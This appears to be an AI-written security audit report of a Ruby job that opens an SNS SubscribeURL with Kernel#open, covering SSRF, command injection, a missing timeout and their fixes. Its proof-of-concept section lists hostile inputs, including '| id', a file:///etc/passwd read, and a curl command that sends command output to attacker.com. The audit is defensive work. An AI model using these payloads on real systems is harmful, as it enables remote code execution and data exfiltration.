# Vulnerability Report

**Target:** snippet (Jobs::ConfirmSnsSubscription)  
**Bug classes:** `ssrf`, `command-injection`  
**Languages:** Ruby  
**Date:** 2025-03-06  

---

## Summary

| Severity | Count |
|----------|--------|
| Critical | 0 |
| High     | 1 |
| Medium   | 1 |
| Low / Info | 0 |

---

## Findings

### Dangerous use of Kernel#open with message-derived URL — `ssrf` / `command-injection`

- **Severity:** High  
- **Location:** snippet (ConfirmSnsSubscription job), line with `open(subscribe_url)`  
- **Sink / pattern:** `open(user_url)` (Kernel#open) — URL comes from verified SNS message body  

**Code (relevant excerpt):**

```ruby
return unless subscribe_url = json["SubscribeURL"].presence
# ...
return unless Aws::SNS::MessageVerifier.new.authentic?(raw)
# confirm subscription by visiting the URL
open(subscribe_url)
```

**Description:**  
`subscribe_url` is taken from the SNS JSON payload and passed to Ruby’s `Kernel#open`. Although the raw message is verified with `Aws::SNS::MessageVerifier`, using `open()` is unsafe: (1) **SSRF** — `open(url)` can issue requests to arbitrary hosts and follow redirects, so a misconfiguration, verifier bug, or key mix-up could allow internal/metadata access; (2) **Command injection** — in Ruby, `open("| command")` runs a shell command, so any flow that could pass a string starting with `|` (e.g. verifier bypass or wrong key) leads to RCE; (3) **Local file read** — `open("file:///etc/passwd")` would read local files. Relying solely on cryptographic verification is brittle; the sink itself should be restricted.

**Remediation:**  
- Do not use `Kernel#open` or `URI.open` for the subscription URL.  
- Use `Net::HTTP` (or a library that only performs HTTP/HTTPS) with:  
  - Allowlist: parse the URL and allow only HTTPS to AWS SNS hostnames (e.g. `sns.<region>.amazonaws.com`).  
  - Connect/read timeouts (e.g. 5–10 seconds) to avoid hanging the worker.  
  - No automatic redirect following, or allow redirects only to the same allowlisted hosts.  
- Reject any URL whose scheme is not `https` or whose host is not in the allowlist before making the request.

---

### No timeout on subscription confirmation request — worker DoS

- **Severity:** Medium  
- **Location:** snippet, same job; no timeout around the confirmation request  

**Code (relevant excerpt):**

```ruby
open(subscribe_url)
```

**Description:**  
The confirmation step uses `open(subscribe_url)` with no connect or read timeout. If the subscription URL is slow or unresponsive (e.g. AWS outage or network issue), the Sidekiq worker can block indefinitely. With `retry: false`, the job will not be retried, but the worker remains occupied until the request completes or the process is killed, which can exhaust the worker pool and cause a denial-of-service for other jobs.

**Remediation:**  
When replacing `open()` with a safe HTTP client (see above), set explicit timeouts (e.g. `open_timeout: 5`, `read_timeout: 10`). If you must use a library that wraps `open`/`URI.open`, ensure it supports timeouts and use the minimum timeout that is acceptable for the confirmation flow.

---

## Exploit chain (optional)

*Not applicable: no multi-step chain identified. The High finding is a single sink that could lead to SSRF or RCE if the SNS verifier were bypassed or misconfigured.*

---

## Proof of concept (Critical / High only)

The High finding depends on the integrity of `Aws::SNS::MessageVerifier`. A direct PoC would require either:

1. **Verifier bypass / misconfiguration**  
   - If the app ever used the wrong key, or a verifier bug allowed a forged message, an attacker could send a job payload (or trigger the job with crafted `args`) where `raw` passes verification and `json["SubscribeURL"]` is:
     - `https://internal-service/admin` (SSRF), or  
     - `| id` (command injection in Ruby’s `open`).

2. **Controlled SNS topic**  
   - If the subscription confirmation is for a topic an attacker can control, they could (in theory) try to use a custom endpoint that returns a redirect to an internal URL. The first request would still go to AWS; impact depends on redirect handling and whether the client follows redirects to non-AWS hosts.

For a **defense-in-depth PoC** (no bypass): use a test job that calls the same code path with `args` where `raw` is a valid SNS subscription confirmation message (from a real AWS SNS subscription) and `SubscribeURL` is an HTTPS URL to an attacker-controlled server. Observe that the server receives a request from the app (SSRF). Then replace the URL with `| curl https://attacker.com/$(id)` (if the verifier were disabled) to demonstrate command injection.

I can help turn this into a small Ruby or Python script (e.g. that builds a valid SNS-style payload and enqueues the job or calls the sink in a test harness) if you share how jobs are enqueued and whether you have a test environment.
